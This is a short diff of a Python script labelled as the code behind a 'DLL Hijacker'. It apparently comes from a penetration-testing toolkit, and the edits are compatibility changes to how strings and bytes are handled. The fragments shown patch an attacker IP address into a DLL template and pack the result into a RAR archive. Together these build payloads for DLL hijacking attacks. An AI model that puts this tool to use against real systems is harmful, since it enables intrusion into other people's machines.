@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 ##################################
 # Code behind the DLL Hijacker
 ####################################
@@ -86,7 +86,7 @@ filewrite = open(userconfigpath + "dll/%s" % (dll), "wb")
 
 host = int(len(ipaddr) + 1) * "X"
 
-filewrite.write(data.replace(bytes(host, 'utf-8'), bytes(ipaddr, 'utf-8') + b"\x00", 1))
+filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
 filewrite.close()
 
 
@@ -123,7 +123,7 @@ if choice == "1":
     # comunicate with the process
     stdout_value = rar_check.communicate()[0]
     # do a search to see if rar is present
-    match = re.search(b"Add files to archive", stdout_value)
+    match = re.search("Add files to archive", stdout_value)
     # we get a hit?
     if match:
         subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" %
